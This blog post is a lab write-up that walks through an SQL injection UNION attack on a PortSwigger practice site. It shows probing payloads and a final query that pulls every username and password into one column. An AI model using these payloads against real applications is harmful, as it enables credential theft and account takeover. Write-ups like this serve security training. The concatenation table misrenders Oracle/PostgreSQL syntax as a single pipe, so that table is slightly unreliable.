---
layout: post
title: "Write-up: SQLi UNION attack, retrieving multiple values in a single column"
date: 2023-06-24
---

Lab: [Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column){:target="_blank"}

<br/>

### Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

<br/>

### Steps

First, we know there are only 2 columns and not 3, since `category=Pets' ORDER BY 2--` doesn't return an error, but `category=Pets' ORDER BY 3--` does.

We also know that the returned columns are an integer and a string, since the following query works without any errors: `category=Pets' UNION SELECT 1, 'a'--`

Therefore, we need to extract the username and password columns, which are usually two separate columns of data type String, from a single column.

You can concatenate multiple strings together to create a single string, using the syntax provided below:

|   |   |
|---|---|
|Oracle|`'foo'\|'bar'`|
|Microsoft|`'foo'+'bar'`|
|PostgreSQL|`'foo'\|'bar'`|
|MySQL|`'foo' 'bar'` *Note the space between the two strings*  <br>`CONCAT('foo','bar')`|

Based on this, let's concatenate the username and password and separate them with a `~`, using the following injection: `category=Pets' UNION SELECT NULL, username || '~' || password FROM users--`

<img src="/images/june2023/5.png" style="max-width:90%;">
Et voilà! The returned string is `administrator~f286lusiqzjnv720jo3k`. Let's test it out:

<img src="/images/june2023/6.png" style="max-width:90%;">

and it's solved! 
